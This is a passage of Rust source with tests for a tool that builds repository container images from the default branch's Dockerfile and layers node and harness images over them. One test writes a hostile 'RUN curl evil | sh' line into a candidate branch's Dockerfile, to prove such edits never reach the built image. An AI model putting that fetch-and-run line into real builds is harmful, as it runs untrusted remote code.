        } else if *count == depth && row.kind == kind {
            victim = Some(row);
        }
        *count += 1;
    }
    let Some(victim) = victim else {
        return;
    };
    let mut doomed = vec![victim.image.clone()];
    if victim.kind == BASE || victim.kind == TRIAL {
        doomed.extend(source_of(repo, victim, &kept_recipes));
    } else {
        let parent = store
            .repo_image_built_as(&victim.parent_image)
            .ok()
            .flatten()
            .filter(|parent| parent.kind == BASE || parent.kind == TRIAL);
        if let Some(parent) = parent {
            doomed.push(parent.image.clone());
            doomed.extend(source_of(repo, &parent, &kept_recipes));
        }
    }
    for image in doomed {
        if !image.is_empty() && !kept.contains(image.as_str()) {
            builder.remove(&image).await;
        }
    }
}

/// The image a repository image was built from under the node's layer: by
/// the digest recorded with it, or, for a build from before that was
/// recorded, by its tag, unless a kept build of the same recipe has since
/// moved that tag onto its own.
fn source_of(
    repo: &Path,
    row: &crate::store::RepoImageRow,
    kept_recipes: &std::collections::HashSet<&str>,
) -> Option<String> {
    if !row.parent_image.is_empty() {
        return Some(row.parent_image.clone());
    }
    (!kept_recipes.contains(row.recipe_hash.as_str())).then(|| source_tag(repo, &row.recipe_hash))
}

/// The image a trial built from `recipe_hash`, if the runtime still holds it.
async fn built_for_trial(
    builder: &dyn ImageBuilder,
    store: &Store,
    repo: &Path,
    recipe_hash: &str,
) -> Option<Built> {
    let row = store
        .ready_repo_image(&repo.to_string_lossy(), TRIAL)
        .ok()
        .flatten()
        .filter(|row| row.recipe_hash == recipe_hash)?;
    (builder.presence(&row.image).await != Presence::Absent).then_some(Built {
        image: BuiltImage {
            image: row.image,
            log_tail: row.log_tail,
        },
        source: row.parent_image,
    })
}

/// An image this node already built from `recipe_hash`, which a trial of the
/// same Dockerfile and context runs in without building anything: the
/// repository's own, or one an earlier trial built.
pub async fn already_built(
    builder: &dyn ImageBuilder,
    store: &Store,
    repo: &Path,
    recipe_hash: &str,
) -> Option<String> {
    let base = store
        .ready_repo_image(&repo.to_string_lossy(), BASE)
        .ok()
        .flatten()
        .filter(|row| row.recipe_hash == recipe_hash);
    if let Some(row) = base {
        if builder.presence(&row.image).await != Presence::Absent {
            return Some(row.image);
        }
    }
    built_for_trial(builder, store, repo, recipe_hash)
        .await
        .map(|built| built.image.image)
}

/// Build `recipe` for a trial of a drafted entry, exactly as `ensure_base`
/// would build it, and record it as the repository's `TRIAL` image. Nothing
/// runs a repository's checks or sessions in it; an entry with this recipe
/// adopts it later rather than building it again.
///
/// A build runs with the network, outside the boundary, so only a trial the
/// operator allowed calls this. Only the newest trial image is kept.
pub async fn build_for_trial(
    builder: &dyn ImageBuilder,
    cfg: &Config,
    store: &Store,
    repo: &Path,
    recipe: &Recipe,
) -> Result<BuiltImage, BuildFailure> {
    let failed = |error: String| BuildFailure {
        error,
        log_tail: String::new(),
        ..Default::default()
    };
    let lock = build_lock(repo);
    let _building = lock.lock().await;
    // Built while this waited for the lock: by an earlier trial, or by the
    // repository's own entry.
    if let Some(image) = already_built(builder, store, repo, &recipe.hash).await {
        return Ok(BuiltImage {
            image,
            log_tail: String::new(),
        });
    }
    if let Some(why) = builder.unavailable().await {
        return Err(BuildFailure::transient(why));
    }
    let repo_path = repo.to_string_lossy();
    let started = RepoImageStart {
        repo_path: &repo_path,
        kind: TRIAL,
        recipe_hash: &recipe.hash,
        source_ref: &recipe.source_ref,
        source_commit: &recipe.source_commit,
        parent_image: "",
    };
    let id = store
        .start_repo_image(&started)
        .map_err(|error| failed(error.to_string()))?;
    tracing::info!(repo = %repo.display(), recipe = %recipe.hash, "building repository image for a trial");
    match build(builder, cfg, store, repo, recipe).await {
        Ok(built) => {
            let _ =
                store.finish_repo_image(&id, Ok(&built.image.image), &built.image.log_tail, &[]);
            let _ = store.set_repo_image_parent(&id, &built.source);
            // The trial image this replaces, unless the repository's own
            // entry has since adopted it: an adopted image is a kept build's.
            supersede(builder, store, repo, TRIAL).await;
            Ok(built.image)
        }
        Err(failure) => {
            tracing::warn!(repo = %repo.display(), error = %failure.error, "trial image build failed");
            settle_failure(store, &id, &failure);
            Err(failure)
        }
    }
}

/// A directory to stage one build in, where the builder wants it.
fn stage_dir(builder: &dyn ImageBuilder) -> std::io::Result<tempfile::TempDir> {
    match builder.scratch_dir() {
        Some(scratch) => {
            std::fs::create_dir_all(&scratch)?;
            tempfile::tempdir_in(scratch)
        }
        None => tempfile::tempdir(),
    }
}

fn source_tag(repo: &Path, recipe_hash: &str) -> String {
    format!(
        "{}-src:{}",
        image_name(repo),
        &recipe_hash[..recipe_hash.len().min(12)]
    )
}

/// What `build` produced: the repository's image, and the image built from
/// its Dockerfile that the node's layer stands on.
struct Built {
    image: BuiltImage,
    source: String,
}

/// Build the repository's own image from its default branch, then the node's
/// layer over it. The context is materialized from Git objects into a
/// directory of the node's; nothing the working tree holds is in it.
async fn build(
    builder: &dyn ImageBuilder,
    cfg: &Config,
    store: &Store,
    repo: &Path,
    recipe: &Recipe,
) -> Result<Built, BuildFailure> {
    let staged = |error: String| BuildFailure {
        error,
        log_tail: String::new(),
        ..Default::default()
    };
    let dir = repo.to_string_lossy();
    let stage = stage_dir(builder).map_err(|e| staged(e.to_string()))?;
    let dockerfile = crate::review::blob(
        &dir,
        &format!("{}:{}", recipe.source_commit, recipe.dockerfile),
    )
    .await
    .map_err(|e| staged(e.to_string()))?;
    let containerfile = stage.path().join("Containerfile");
    std::fs::write(&containerfile, dockerfile).map_err(|e| staged(e.to_string()))?;
    let scratch = builder.scratch_dir().unwrap_or_else(std::env::temp_dir);
    let context = crate::review::snapshot_candidate_in(
        &scratch,
        &dir,
        &recipe.context_tree,
        cfg.supervision.max_snapshot_bytes,
    )
    .await
    .map_err(|e| staged(format!("build context: {e}")))?;
    let labels = [(RECIPE_LABEL.to_string(), recipe.hash.clone())];
    let source = builder
        .build(ImageBuild {
            tag: &source_tag(repo, &recipe.hash),
            containerfile: &containerfile,
            context: &context.root,
            labels: &labels,
            timeout: BUILD_TIMEOUT,
        })
        .await?;

    let layer = stage.path().join("Normalised.Containerfile");
    std::fs::write(&layer, normalised(&source.image, &RunAs::of(cfg)))
        .map_err(|e| staged(e.to_string()))?;
    let empty = stage.path().join("empty");
    std::fs::create_dir_all(&empty).map_err(|e| staged(e.to_string()))?;
    let built = match builder
        .build(ImageBuild {
            tag: &format!("{}:{}", image_name(repo), &recipe.hash[..12]),
            containerfile: &layer,
            context: &empty,
            labels: &labels,
            timeout: BUILD_TIMEOUT,
        })
        .await
    {
        Ok(built) => built,
        Err(failure) => {
            // Nothing will stand on it, unless a build that stands already
            // does: a cached rebuild can produce the very same source image.
            let stands = store
                .ready_repo_images(&repo.to_string_lossy())
                .map(|rows| rows.iter().any(|row| row.parent_image == source.image))
                .unwrap_or(true);
            if !stands {
                builder.remove(&source.image).await;
            }
            return Err(failure);
        }
    };
    // The repository's own build is the one worth reading; the layer over it
    // prints a few lines at most.
    Ok(Built {
        image: BuiltImage {
            image: built.image,
            log_tail: source.log_tail,
        },
        source: source.image,
    })
}

/// The commands whose first word the image has no tool for, so the operator
/// hears it when the image is built rather than from a check that could not
/// run. A probe that cannot run says nothing.
async fn missing_tools(runner: &dyn Runner, image: &str, commands: &[String]) -> Vec<String> {
    let mut tools: Vec<&str> = Vec::new();
    for command in commands {
        // An assignment or a path is not a tool the image is expected to hold.
        match command.split_whitespace().next() {
            Some(word) if !word.contains(['=', '/']) && !tools.contains(&word) => tools.push(word),
            _ => {}
        }
    }
    if tools.is_empty() {
        return Vec::new();
    }
    let mut argv: Vec<String> = [
        "sh",
        "-lc",
        "for tool in \"$@\"; do command -v \"$tool\" >/dev/null 2>&1 || echo \"$tool\"; done",
        "sh",
    ]
    .map(String::from)
    .to_vec();
    argv.extend(tools.iter().map(|tool| tool.to_string()));
    let out = runner
        .run_capture(RunnerCommand {
            argv,
            image: Some(image.to_string()),
            name: format!("tracon-probe-{}", uuid::Uuid::now_v7().simple()),
            ..Default::default()
        })
        .await;
    let Ok(out) = out else {
        return Vec::new();
    };
    let missing = String::from_utf8_lossy(&out.stdout);
    commands
        .iter()
        .filter(|command| {
            command
                .split_whitespace()
                .next()
                .is_some_and(|word| missing.lines().any(|line| line.trim() == word))
        })
        .cloned()
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::runner::local::LocalRunner;
    use async_trait::async_trait;

    /// Records what it was asked to build and reads the Containerfile and
    /// context while they still exist, as a real build would.
    #[derive(Default)]
    struct FakeBuilder {
        builds: StdMutex<Vec<(String, String, Vec<String>)>>,
        removed: StdMutex<Vec<String>>,
        fail: StdMutex<bool>,
        pruned: StdMutex<bool>,
        /// Fail as a builder that cannot build, not as a recipe.
        broken: StdMutex<bool>,
        /// What `unavailable` says.
        down: StdMutex<Option<String>>,
        /// Whether the store can be asked about images.
        unknown: StdMutex<bool>,
        /// Keep a previous generation, as a registry does.
        retains: bool,
        /// Give the same build the same digest every time, as a cache does.
        same_digest: bool,
        /// Fail every build from this many builds on.
        fail_from: StdMutex<Option<usize>>,
        /// Find no image by tag, as a registry that holds none.
        missing: StdMutex<bool>,
    }

    #[async_trait]
    impl ImageBuilder for FakeBuilder {
        async fn build(&self, build: ImageBuild<'_>) -> Result<BuiltImage, BuildFailure> {
            if *self.broken.lock().unwrap() {
                return Err(BuildFailure::transient("buildkitd did not answer"));
            }
            let failing = (*self.fail_from.lock().unwrap())
                .is_some_and(|from| self.builds.lock().unwrap().len() >= from);
            if failing {
                return Err(BuildFailure {
                    error: "the layer did not build".into(),
                    ..Default::default()
                });
            }
            if *self.fail.lock().unwrap() {
                return Err(BuildFailure {
                    error: "podman build exited 1".into(),
                    log_tail: "Error: no such package".into(),
                    ..Default::default()
                });
            }
            let text = std::fs::read_to_string(build.containerfile).unwrap();
            let mut files: Vec<String> = std::fs::read_dir(build.context)
                .unwrap()
                .map(|entry| entry.unwrap().file_name().to_string_lossy().into_owned())
                .collect();
            files.sort();
            let name = build.tag.rsplit_once(':').unwrap().0.to_string();
            // Every build its own digest, as a real one with a timestamp is.
            let count = match self.same_digest {
                true => 0,
                false => self.builds.lock().unwrap().len(),
            };
            let digest = hex::encode(Sha256::digest(format!("{}{text}{count}", build.tag)));
            self.builds
                .lock()
                .unwrap()
                .push((build.tag.to_string(), text, files));
            Ok(BuiltImage {
                image: format!("{name}@sha256:{digest}"),
                log_tail: "built".into(),
            })
        }
        async fn exists(&self, _image: &str) -> bool {
            !*self.pruned.lock().unwrap()
        }
        async fn identity(&self, image: &str) -> Option<String> {
            if *self.missing.lock().unwrap() {
                return None;
            }
            let digest = hex::encode(Sha256::digest(image));
            Some(format!("{image}@sha256:{digest}"))
        }
        async fn remove(&self, image: &str) {
            self.removed.lock().unwrap().push(image.to_string());
        }
        async fn presence(&self, image: &str) -> Presence {
            let unknown = *self.unknown.lock().unwrap();
            match unknown {
                true => Presence::Unknown,
                false => match self.exists(image).await {
                    true => Presence::Present,
                    false => Presence::Absent,
                },
            }
        }
        async fn unavailable(&self) -> Option<String> {
            self.down.lock().unwrap().clone()
        }
        fn retains_previous(&self) -> bool {
            self.retains
        }
    }

    fn sh(dir: &Path, script: &str) {
        let status = std::process::Command::new("sh")
            .arg("-c")
            .arg(script)
            .current_dir(dir)
            .status()
            .unwrap();
        assert!(status.success(), "{script}");
    }

    /// A checkout whose default branch holds a Dockerfile and one file beside
    /// it, with `origin/HEAD` where a clone would have it.
    fn checkout() -> tempfile::TempDir {
        let tmp = tempfile::tempdir().unwrap();
        sh(
            tmp.path(),
            "git init -q -b main . && git config user.email t@e && git config user.name t \
             && mkdir .devcontainer && printf 'FROM scratch\\nCOPY tool.conf /etc/\\n' > .devcontainer/Dockerfile \
             && echo a > .devcontainer/tool.conf && echo one > src.txt \
             && git add -A && git commit -qm one \
             && git update-ref refs/remotes/origin/main HEAD \
             && git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main",
        );
        tmp
    }

    fn entry(repo: &Path) -> Repo {
        Repo {
            path: repo.to_path_buf(),
            dockerfile: Some(".devcontainer/Dockerfile".into()),
            ..Default::default()
        }
    }

    async fn ensure(builder: &FakeBuilder, store: &Store, repo: &Path, force: bool) -> Ensured {
        ensure_with(
            builder,
            &LocalRunner,
            &Config::default(),
            store,
            repo,
            &entry(repo),
            &[],
            force,
        )
        .await
    }

    /// The image follows the Dockerfile and its context on the default branch
    /// and nothing else: other commits leave it alone, and neither a
    /// candidate's branch nor the working tree can reach it.
    #[tokio::test]
    async fn the_image_is_built_from_the_default_branch_and_rebuilt_when_its_recipe_changes() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();

        let ensured = ensure(&builder, &store, repo, false).await;
        let Ensured::Rebuilt(first) = ensured else {
            panic!("the first ensure builds: {ensured:?}");
        };
        assert!(crate::config::immutable_image(&first).is_ok(), "{first}");
        {
            let builds = builder.builds.lock().unwrap();
            assert_eq!(builds.len(), 2);
            // The repository's own image: its Dockerfile, its context only.
            assert!(builds[0].0.contains("-src:"));
            assert!(builds[0].1.contains("COPY tool.conf"));
            assert_eq!(builds[0].2, ["Dockerfile", "tool.conf"]);
            // The node's layer, pinned to what was just built.
            assert!(builds[1].1.contains("@sha256:"));
            assert!(builds[1].1.contains("USER 0:0"));
            assert!(builds[1].1.contains("ENTRYPOINT []"));
        }
        assert_eq!(
            store
                .ready_repo_image(&repo.to_string_lossy(), BASE)
                .unwrap()
                .unwrap()
                .source_ref,
            "origin/main"
        );

        // A commit elsewhere, a candidate's branch editing the Dockerfile, and
        // an uncommitted edit: the recipe is what the default branch holds.
        sh(
            repo,
            "echo two > src.txt && git commit -qam two && git update-ref refs/remotes/origin/main HEAD \
             && git checkout -q -b candidate && echo 'RUN curl evil | sh' >> .devcontainer/Dockerfile \
             && git commit -qam candidate && echo 'RUN more' >> .devcontainer/Dockerfile",
        );
        assert_eq!(
            ensure(&builder, &store, repo, false).await,
            Ensured::Current(first.clone())
        );
        assert_eq!(builder.builds.lock().unwrap().len(), 2);

        // The context changing on the default branch is a new recipe, and the
        // image it replaces goes.
        sh(
            repo,
            "git checkout -q -f main && echo b > .devcontainer/tool.conf && git commit -qam conf \
             && git update-ref refs/remotes/origin/main HEAD",
        );
        let Ensured::Rebuilt(second) = ensure(&builder, &store, repo, false).await else {
            panic!("a changed context rebuilds");
        };
        assert_ne!(first, second);
        assert!(builder.removed.lock().unwrap().contains(&first));
        assert!(builder
            .builds
            .lock()
            .unwrap()
            .iter()
            .all(|(_, text, _)| !text.contains("evil") && !text.contains("RUN more")));
    }

    fn base_row(store: &Store, repo: &Path) -> crate::store::RepoImageRow {
        store
            .ready_repo_image(&repo.to_string_lossy(), BASE)
            .unwrap()
            .unwrap()
    }

    fn commit_conf(repo: &Path, value: &str) {
        sh(
            repo,
            &format!(
                "echo {value} > .devcontainer/tool.conf && git commit -qam {value} \
                 && git update-ref refs/remotes/origin/main HEAD"
            ),
        );
    }

    /// A builder that cannot build at all, said before anything is staged or
    /// found during the build, is not a verdict on the recipe: nothing is
    /// recorded against it, and after a short cooldown (in which the queue
    /// behind it does not each try again) the next ask builds without being
    /// told to.
    #[tokio::test]
    async fn a_builder_that_cannot_build_is_not_held_against_the_recipe() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        let path = repo.to_string_lossy();
        let hash = recipe(repo, &entry(repo), &RunAs::Root).await.unwrap().hash;

        *builder.down.lock().unwrap() = Some("buildkitd did not answer, so no".into());
        let ensured = ensure(&builder, &store, repo, false).await;
        let Ensured::Unavailable { reason } = &ensured else {
            panic!("{ensured:?}");
        };
        assert!(
            reason.starts_with("buildkitd did not answer, so no; tried again in 1")
                && reason.ends_with("or at once by `tracon repo build`"),
            "{reason}"
        );
        assert!(builder.builds.lock().unwrap().is_empty());
        assert_eq!(store.latest_repo_image(&path, BASE).unwrap(), None);

        // Cooling down: the builder is not asked again, even once it is back.
        *builder.down.lock().unwrap() = None;
        let ensured = ensure(&builder, &store, repo, false).await;
        assert!(
            matches!(&ensured, Ensured::Unavailable { reason } if reason.contains("tried again in")),
            "{ensured:?}"
        );
        assert!(builder.builds.lock().unwrap().is_empty());

        // A build the builder breaks mid-way is not recorded either.
        warm(repo, &hash);
        *builder.broken.lock().unwrap() = true;
        let ensured = ensure(&builder, &store, repo, false).await;
        assert!(
            matches!(&ensured, Ensured::Unavailable { reason }
                if reason.starts_with("buildkitd did not answer; tried again in")),
            "{ensured:?}"
        );
        assert_eq!(store.latest_repo_image(&path, BASE).unwrap(), None);

        // The operator asking goes past the cooldown; once it builds, the
        // cooldown is gone.
        *builder.broken.lock().unwrap() = false;
        assert!(matches!(
            ensure(&builder, &store, repo, true).await,
            Ensured::Rebuilt(_)
        ));
        assert_eq!(cooling(repo, &hash), None);
    }

    /// A layer that fails to build takes the source image built for it away,
    /// unless a build that stands already stands on that very image, as a
    /// cached rebuild of the same recipe can produce.
    #[tokio::test]
    async fn a_failed_layer_leaves_a_source_image_a_standing_build_uses() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder {
            same_digest: true,
            ..Default::default()
        };
        assert!(matches!(
            ensure(&builder, &store, repo, false).await,
            Ensured::Rebuilt(_)
        ));
        let source = base_row(&store, repo).parent_image;
        *builder.fail_from.lock().unwrap() = Some(3);
        let ensured = ensure(&builder, &store, repo, true).await;
        assert!(matches!(ensured, Ensured::Stale { .. }), "{ensured:?}");
        assert!(!builder.removed.lock().unwrap().contains(&source));

        // With nothing standing on it, it goes.
        let other = checkout();
        let fresh = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        *builder.fail_from.lock().unwrap() = Some(1);
        ensure(&builder, &fresh, other.path(), false).await;
        let removed = builder.removed.lock().unwrap().clone();
        assert_eq!(removed.len(), 1);
        assert!(removed[0].contains("-src@sha256:"), "{removed:?}");
    }

    /// A builder that cannot say whether the image is still there keeps it in
    /// use and builds nothing on that account, even for a recipe that moved.
    #[tokio::test]
    async fn an_image_that_cannot_be_asked_about_is_kept_and_not_rebuilt() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        let Ensured::Rebuilt(first) = ensure(&builder, &store, repo, false).await else {
            panic!("the first ensure builds");
        };
        commit_conf(repo, "moved");
        *builder.unknown.lock().unwrap() = true;
        let ensured = ensure(&builder, &store, repo, false).await;
        assert!(
            matches!(&ensured, Ensured::Stale { using, .. } if *using == first),
            "{ensured:?}"
        );
        assert_eq!(builder.builds.lock().unwrap().len(), 2);
        assert!(builder.removed.lock().unwrap().is_empty());

        *builder.unknown.lock().unwrap() = false;
        assert!(matches!(
            ensure(&builder, &store, repo, false).await,
            Ensured::Rebuilt(_)
        ));
    }

    /// A forced rebuild of the same recipe moves the source tag onto the new
    /// source image, so the old one is removed by the digest recorded with
    /// it, and the new one stays.
    #[tokio::test]
    async fn a_superseded_source_image_is_removed_by_its_recorded_digest() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        let Ensured::Rebuilt(first) = ensure(&builder, &store, repo, false).await else {
            panic!("the first ensure builds");
        };
        let first_source = base_row(&store, repo).parent_image;
        assert!(
            first_source.contains("-src@sha256:"),
            "the source is recorded by digest: {first_source}"
        );
        let Ensured::Rebuilt(second) = ensure(&builder, &store, repo, true).await else {
            panic!("a forced ensure builds");
        };
        assert_ne!(first, second);
        let second_source = base_row(&store, repo).parent_image;
        assert_ne!(first_source, second_source);
        let removed = builder.removed.lock().unwrap().clone();
        assert!(
            removed.contains(&first) && removed.contains(&first_source),
            "{removed:?}"
        );
        assert!(
            !removed
                .iter()
                .any(|image| image == &second_source || image.contains("-src:")),
            "{removed:?}"
        );
    }

    /// A builder that keeps a previous generation removes a build only once a
    /// second one has replaced it, so a pod still about to pull the one
    /// before finds it.
    #[tokio::test]
    async fn a_registry_keeps_the_previous_generation() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder {
            retains: true,
            ..Default::default()
        };
        let Ensured::Rebuilt(first) = ensure(&builder, &store, repo, false).await else {
            panic!("the first ensure builds");
        };
        let first_source = base_row(&store, repo).parent_image;
        commit_conf(repo, "second");
        let Ensured::Rebuilt(second) = ensure(&builder, &store, repo, false).await else {
            panic!("a moved recipe rebuilds");
        };
        assert!(builder.removed.lock().unwrap().is_empty());
        commit_conf(repo, "third");
        assert!(matches!(
            ensure(&builder, &store, repo, false).await,
            Ensured::Rebuilt(_)
        ));
        let removed = builder.removed.lock().unwrap().clone();
        assert_eq!(removed, vec![first, first_source]);
        assert!(!removed.contains(&second));
    }

    /// A Dockerfile that stops building does not take the repository's image
    /// away, and is not rebuilt on every ask.
    /// A trial builds exactly what the entry's own build would, records it
    /// beside the repository's image rather than as it, and an entry with the
    /// same recipe then adopts it instead of building it again.
    #[tokio::test]
    async fn an_entry_adopts_the_image_a_trial_built_from_its_recipe() {
        let tmp = checkout();
        let repo = tmp.path();
        let repo_path = repo.to_string_lossy();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        let cfg = Config::default();

        let first = recipe(repo, &entry(repo), &RunAs::Root).await.unwrap();
        assert_eq!(
            already_built(&builder, &store, repo, &first.hash).await,
            None
        );
        let tried = build_for_trial(&builder, &cfg, &store, repo, &first)
            .await
            .unwrap();
        assert_eq!(builder.builds.lock().unwrap().len(), 2);
        assert_eq!(
            already_built(&builder, &store, repo, &first.hash).await,
            Some(tried.image.clone())
        );
        // Tried, not taken: nothing runs the repository's work in it yet.
        assert!(store.ready_repo_image(&repo_path, BASE).unwrap().is_none());
        // Asked again, it is not built twice.
        build_for_trial(&builder, &cfg, &store, repo, &first)
            .await
            .unwrap();
        assert_eq!(builder.builds.lock().unwrap().len(), 2);

        assert_eq!(
            ensure(&builder, &store, repo, false).await,
            Ensured::Rebuilt(tried.image.clone())
        );
        assert_eq!(
            builder.builds.lock().unwrap().len(),
            2,
            "adopted, not rebuilt"
        );
        let base = store.ready_repo_image(&repo_path, BASE).unwrap().unwrap();
        assert_eq!(base.image, tried.image);
        assert_eq!(base.recipe_hash, first.hash);

        // A later trial of another recipe keeps only its own trial image, and
        // never removes the one the entry adopted.
        let mut images = Vec::new();
        for conf in ["b", "c"] {
            sh(
                repo,
                &format!(
                    "echo {conf} > .devcontainer/tool.conf && git commit -qam {conf} \
                     && git update-ref refs/remotes/origin/main HEAD"
                ),
            );
            let next = recipe(repo, &entry(repo), &RunAs::Root).await.unwrap();
            assert_ne!(next.hash, first.hash);
            images.push(
                build_for_trial(&builder, &cfg, &store, repo, &next)
                    .await
                    .unwrap()
                    .image,
            );
        }
        let removed = builder.removed.lock().unwrap();
        assert!(!removed.contains(&tried.image), "{removed:?}");
        assert!(removed.contains(&images[0]), "{removed:?}");
        assert!(!removed.contains(&images[1]), "{removed:?}");
    }

    #[tokio::test]
    async fn a_failed_build_keeps_the_last_image_and_is_not_retried_unasked() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        let Ensured::Rebuilt(good) = ensure(&builder, &store, repo, false).await else {
            panic!("the first ensure builds");
        };

        sh(
            repo,
            "echo 'RUN false' >> .devcontainer/Dockerfile && git commit -qam broken \
             && git update-ref refs/remotes/origin/main HEAD",
        );
        *builder.fail.lock().unwrap() = true;
        let Ensured::Stale { using, error } = ensure(&builder, &store, repo, false).await else {
            panic!("a failed build falls back");
        };
        assert_eq!(using, good);
        assert!(error.contains("exited 1"), "{error}");
        let failed = store
            .latest_repo_image(&repo.to_string_lossy(), BASE)
            .unwrap()
            .unwrap();
        assert_eq!(failed.status, "failed");
        assert_eq!(failed.log_tail, "Error: no such package");

        // Asked again, it answers from the record; asked to build, it builds.
        *builder.fail.lock().unwrap() = false;
        let Ensured::Stale { error, .. } = ensure(&builder, &store, repo, false).await else {
            panic!("the failure stands until someone asks for a build");
        };
        assert!(error.contains("tracon repo build"), "{error}");
        assert!(matches!(
            ensure(&builder, &store, repo, true).await,
            Ensured::Rebuilt(_)
        ));
    }

    /// With no image that ever built, a failure leaves nothing to run in; and
    /// an image the runtime no longer holds is built again rather than named.
    #[tokio::test]
    async fn an_image_that_is_gone_is_built_again() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();

        let missing = Repo {
            dockerfile: Some("docker/Dockerfile".into()),
            ..entry(repo)
        };
        let unavailable = ensure_with(
            &builder,
            &LocalRunner,
            &Config::default(),
            &store,
            repo,
            &missing,
            &[],
            false,
        )
        .await;
        let Ensured::Unavailable { reason } = unavailable else {
            panic!("a Dockerfile the default branch does not hold cannot build");
        };
        assert!(
            reason.contains("docker/Dockerfile is not in origin/main"),
            "{reason}"
        );

        assert!(matches!(
            ensure(&builder, &store, repo, false).await,
            Ensured::Rebuilt(_)
        ));
        *builder.pruned.lock().unwrap() = true;
        assert!(matches!(
            ensure(&builder, &store, repo, false).await,
            Ensured::Rebuilt(_)
        ));
    }

    #[tokio::test]
    async fn a_command_the_image_has_no_tool_for_is_named_when_it_is_built() {
        let commands = [
            "sh -c true".to_string(),
            "tracon-no-such-tool --check".to_string(),
            "FOO=1 make".to_string(),
            "./scripts/check.sh".to_string(),
        ];
        assert_eq!(
            missing_tools(&LocalRunner, "ignored", &commands).await,
            ["tracon-no-such-tool --check"]
        );
    }

    /// Answers the harness probe with whatever the test says the image does.
    struct ProbeRunner {
        says: &'static str,
        exit: i32,
        ran_in: StdMutex<Vec<String>>,
    }

    impl ProbeRunner {
        fn saying(says: &'static str, exit: i32) -> Self {
            Self {
                says,
                exit,
                ran_in: StdMutex::new(Vec::new()),
            }
        }
    }

    #[async_trait]
    impl Runner for ProbeRunner {
        async fn spawn(
            &self,
            _cmd: RunnerCommand,
        ) -> Result<crate::runner::Spawned, crate::runner::RunnerError> {
            Err(crate::runner::RunnerError::Other("not used here".into()))
        }
        async fn run_capture(
            &self,
            cmd: RunnerCommand,
        ) -> Result<std::process::Output, crate::runner::RunnerError> {
            use std::os::unix::process::ExitStatusExt;
            self.ran_in
                .lock()
                .unwrap()
                .push(cmd.image.unwrap_or_default());
            Ok(std::process::Output {
                status: std::process::ExitStatus::from_raw(self.exit << 8),
                stdout: self.says.as_bytes().to_vec(),
                stderr: Vec::new(),
            })
        }
        async fn kill(&self, _name: &str) -> Result<(), crate::runner::RunnerError> {
            Ok(())
        }
    }

    const BASE_IMAGE: &str =
        "localhost/tracon-repo-app@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

    fn claude(image: &str) -> SessionHarness<'static> {
        claude_as(image, RunAs::Root)
    }

    fn claude_as(image: &str, run_as: RunAs) -> SessionHarness<'static> {
        SessionHarness {
            id: "claude",
            version: "2.1.295",
            image: image.to_string(),
            layer: harness_layer("claude", &run_as).unwrap(),
            run_as,
        }
    }

    fn pod() -> RunAs {
        RunAs::of(&kubernetes())
    }

    fn kubernetes() -> Config {
        let mut cfg = Config::default();
        cfg.runtime.kind = crate::config::RuntimeKind::Kubernetes;
        cfg
    }

    /// The harness goes onto the repository's image as a layer, proven to run
    /// there, and is rebuilt when the harness image moves — which leaves the
    /// repository's image, and every check's evidence, where it was.
    #[tokio::test]
    async fn the_harness_is_layered_onto_the_repository_image_and_follows_the_harness() {
        let repo = Path::new("/src/app");
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        let runner = ProbeRunner::saying("2.1.295 (Claude Code)\ngit version 2.50", 0);
        let harness = claude("localhost/tracon-harness-claude");

        let first =
            ensure_session_with(&builder, &runner, &store, repo, BASE_IMAGE, &harness).await;
        let image = first.image.clone().expect("the session image is built");
        assert_eq!(first.toolchain_image.as_deref(), Some(BASE_IMAGE));
        assert_eq!(first.note, None);
        assert_eq!(first.source(), "repository image");
        // Proven in the image that was built, not in the harness's own.
        assert_eq!(
            runner.ran_in.lock().unwrap().as_slice(),
            std::slice::from_ref(&image)
        );
        {
            let builds = builder.builds.lock().unwrap();
            let text = &builds[0].1;
            assert!(text.starts_with("FROM localhost/tracon-harness-claude@sha256:"));
            assert!(text.contains(&format!("FROM {BASE_IMAGE}\n")));
            assert!(text.contains("COPY --from=harness /usr/local/bin/claude"));
            assert!(text.contains("USER 0:0") && text.contains("ENTRYPOINT []"));
        }

        // Asked again, nothing is built and nothing is probed.
        let again =
            ensure_session_with(&builder, &runner, &store, repo, BASE_IMAGE, &harness).await;
        assert_eq!(again, first);
        assert_eq!(builder.builds.lock().unwrap().len(), 1);

        // A harness image that moved is a new layer over the same base.
        let upgraded = claude("localhost/tracon-harness-claude-next");
        let next =
            ensure_session_with(&builder, &runner, &store, repo, BASE_IMAGE, &upgraded).await;
        assert_ne!(next.image, first.image);
        assert_eq!(next.toolchain_image.as_deref(), Some(BASE_IMAGE));
        let removed = builder.removed.lock().unwrap();
        assert!(removed.contains(&image));
        assert!(!removed.iter().any(|gone| gone == BASE_IMAGE));
    }

    /// A session layer over an image an entry pinned is replaced without
    /// that image going with it: the node removes only what it built.
    #[tokio::test]
    async fn a_pinned_base_is_never_removed_with_its_session_layer() {
        let repo = Path::new("/src/pinned");
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        let runner = ProbeRunner::saying("2.1.295 (Claude Code)", 0);
        let harness = claude("localhost/tracon-harness-claude");
        let other = BASE_IMAGE.replace("aaaa", "bbbb");
        let first =
            ensure_session_with(&builder, &runner, &store, repo, BASE_IMAGE, &harness).await;
